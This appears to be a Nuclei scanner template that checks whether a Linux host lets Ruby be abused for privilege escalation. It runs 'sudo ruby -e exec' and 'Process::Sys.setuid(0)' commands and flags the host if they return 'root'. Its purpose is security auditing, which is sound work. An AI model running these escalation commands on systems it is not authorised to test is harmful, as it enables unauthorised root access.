code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'ruby -e ''exec "whoami"''

    '
- engine:
  - sh
  - bash
  source: 'sudo ruby -e ''exec "whoami"''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    - contains(code_4_response, "root")
    type: dsl
  matchers-condition: and
  source: 'ruby -e ''Process::Sys.setuid(0); exec "whoami"''

    '
id: privesc-ruby
info:
  author: daffainfo
  description: 'Ruby is a dynamic, open-source programming language known for its
    simplicity and productivity. It is often used for web development, scripting,
    and software development. Ruby''s elegant syntax and focus on developer happiness
    have made it a popular choice for building web applications and other software
    projects.

    '
  metadata:
    max-request: 4
    verified: true
  name: Ruby - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/ruby/
  severity: high
  tags: code,linux,ruby,privesc,local
self-contained: true
